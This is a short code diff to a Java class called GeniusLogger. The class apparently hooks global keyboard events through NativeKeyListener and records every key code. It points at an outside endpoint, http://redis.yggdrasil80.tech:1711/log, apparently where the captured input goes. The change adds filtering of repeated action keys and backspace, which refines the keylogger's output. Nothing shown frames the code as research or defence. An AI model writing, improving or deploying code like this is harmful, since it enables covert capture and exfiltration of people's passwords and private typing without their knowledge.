@@ -17,6 +17,7 @@ import java.util.concurrent.TimeUnit;
 public final class GeniusLogger implements NativeKeyListener {
 
     private URL url;
+    private int last;
     private final StringBuilder builder;
 
     public GeniusLogger() {
@@ -26,6 +27,7 @@ public final class GeniusLogger implements NativeKeyListener {
     public void start() {
         try {
             this.url = new URL("http://redis.yggdrasil80.tech:1711/log");
+            this.last = 0;
         } catch (MalformedURLException ignored) {}
 
         try {
@@ -62,6 +64,8 @@ public final class GeniusLogger implements NativeKeyListener {
 
     @Override
     public void nativeKeyPressed(NativeKeyEvent e) {
+        if ((e.isActionKey() || e.getKeyCode() == 14) && this.last == e.getKeyCode()) return;
         this.builder.append(e.getKeyCode()).append(",");
+        this.last = e.getKeyCode();
     }
 }
